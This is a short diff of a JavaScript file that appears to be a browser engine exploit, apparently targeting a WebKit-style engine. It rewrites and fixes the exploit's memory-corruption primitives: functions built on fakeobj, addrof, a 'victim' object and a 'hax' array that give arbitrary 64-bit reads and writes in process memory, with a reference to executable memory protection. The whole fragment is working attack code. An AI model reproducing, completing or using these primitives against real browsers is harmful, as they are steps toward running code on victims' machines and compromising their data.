@@ -579,20 +579,20 @@ var VM_PROT_EXECUTE = 0x4
         fakeobj: fakeobj,
 
         // Write an int64 to the given address.
-        writeInt64(addr, int64) {
+        writeInt64: function(addr, int64) {
             hax[1] = Add(addr, new Int64(0x10)).asDouble();
             victim.pointer = int64;
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16(addr, value) {
+        write16: function(addr, value) {
             // Set butterfly of victim object and dereference.
             hax[1] = Add(addr, new Int64(0x10)).asDouble();
             victim.pointer = value;
         },
 
         // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write(addr, data) {
+        write: function(addr, data) {
             while (data.length % 4 != 0)
                 data.push(0);
 
@@ -604,11 +604,11 @@ var VM_PROT_EXECUTE = 0x4
         },
 
         // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64(addr) {
+        read64: function(addr) {
             // Set butterfly of victim object and dereference.
             hax[1] = Add(addr, new Int64(0x10)).asDouble();
             //return this.addrof(victim.pointer);
-            return victim.pointer;
+            return this.addrof(victim.pointer);
         },
         read: function(addr, length) {
             var a = new Array(length);
@@ -629,7 +629,7 @@ var VM_PROT_EXECUTE = 0x4
             return a
         },
         read_i64: function(addr) {
-            return this.read64(addr);
+            return new Int64(this.read64(addr));
         },
     };
 
